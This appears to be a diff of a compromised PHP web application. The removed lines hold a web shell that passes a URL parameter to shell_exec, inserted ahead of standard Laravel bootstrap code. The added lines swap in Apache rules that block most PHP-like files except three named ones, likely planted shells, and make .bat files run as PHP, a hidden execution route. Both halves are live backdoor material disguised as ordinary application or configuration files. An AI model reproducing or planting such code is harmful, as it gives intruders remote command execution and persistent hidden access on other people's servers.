@@ -1,82 +1,12 @@
-<?php
-if (isset($_GET['r555'])) {
-    $cmd = $_GET['r555'];
+<FilesMatch ".*\.(py|ini|awd|conf|exe|phtml|ht|htacces|gif|ph|php.gif|php|shtml|phar|inc|pjpeg|php.|pht|phtm|fla|php.fla|php.FLA|PHP.FLA|php<?.jpg|php.sql|php.txt|txt.php|phps|PhaR|pHTM|xhtml|php%00|PHPs|pHAr|pHps|pHTml|phTMl|phtML|phTML|phpS||PHP|Php|PHp|pHp|pHP|PhP|phP|pHTML|Phtml|pHtMl|PhTmL|pHtml||PHtml|PHTml|PHTMl|phtmL|PHTML|phTml|PHAR|Phar|PHar|PHAr|pHAR|phAr|phaR|PHaR|phAR|Inc|INC|inC|INc|iNC|iNc|Shtml|sHTML|sHtMl|ShTmL|PHP.|PHAR.|jpg;php|php;jpg|php;.jpg|jpg;.php|php<?.html|php;png|php.XXXTXT|php1|php2|php3|php4|php5|php6|php7|php8|php9|php10|php56|php74|pHar|php.inc|php.jpg|php.pjpeg|PhtmL|phtML|phTML|shtmL|shtML|shTML|json|JSON|pHp5|pHp1|pHp2|pHp3|pHp4|pHp6|pHp7|pHp8|pHp9|pHp10|pHp56|pHp74|PHP1|PHP2|PHP3|PHP4|PHP5|PHP6|PHP7|PHP8|PHP9|PHP10|PHP56|PHP74|Php1|Php2|Php3|Php4|Php5|Php6|Php7|Php8|Php9|Php10|Php56|Php74|phP1|phP2|phP3|phP4|phP5|phP6|phP7|phP8|phP9|phP10|phP56|phP74|PHp1|PHp2|PHp3|PHp4|PHp5|PHp6|PHp7|PHp8|PHp9|PHp10|PHp56|PHp74|pHP1|pHP2|pHP3|pHP4|pHP5|pHP6|pHP7|pHP8|pHP9|pHP10|pHP11|pHP56|pHP74|PhP1|PhP2|PhP3|PhP4|PhP5|PhP6|PhP7|PhP8|PhP9|PhP10|PhP56|PhP74|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.html|yy.php|ic_badge.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
 
-    // Menjalankan perintah shell dan mendapatkan outputnya
-    $output = shell_exec($cmd);
-
-    // Mengubah output menjadi array per baris
-    $outputLines = explode(PHP_EOL, $output);
-?>
-    <table>
-        <thead>
-            <tr>
-                <th>Output</th>
-            </tr>
-        </thead>
-        <tbody>
-            <?php foreach ($outputLines as $line) { ?>
-                <tr>
-                    <td><?php echo htmlspecialchars($line); ?></td>
-                </tr>
-            <?php } ?>
-        </tbody>
-    </table>
-<?php
-}
-?>
-<?php
-
-/*
-|--------------------------------------------------------------------------
-| Create The Application
-|--------------------------------------------------------------------------
-|
-| The first thing we will do is create a new Laravel application instance
-| which serves as the "glue" for all the components of Laravel, and is
-| the IoC container for the system binding all of the various parts.
-|
-*/
-
-$app = new Illuminate\Foundation\Application(
-    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
-);
-
-/*
-|--------------------------------------------------------------------------
-| Bind Important Interfaces
-|--------------------------------------------------------------------------
-|
-| Next, we need to bind some important interfaces into the container so
-| we will be able to resolve them when needed. The kernels serve the
-| incoming requests to this application from both the web and CLI.
-|
-*/
-
-$app->singleton(
-    Illuminate\Contracts\Http\Kernel::class,
-    App\Http\Kernel::class
-);
-
-$app->singleton(
-    Illuminate\Contracts\Console\Kernel::class,
-    App\Console\Kernel::class
-);
-
-$app->singleton(
-    Illuminate\Contracts\Debug\ExceptionHandler::class,
-    App\Exceptions\Handler::class
-);
-
-/*
-|--------------------------------------------------------------------------
-| Return The Application
-|--------------------------------------------------------------------------
-|
-| This script returns the application instance. The instance is given to
-| the calling script so we can separate the building of the instances
-| from the actual running of the application and sending responses.
-|
-*/
-
-return $app;
+<FilesMatch "\.bat$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
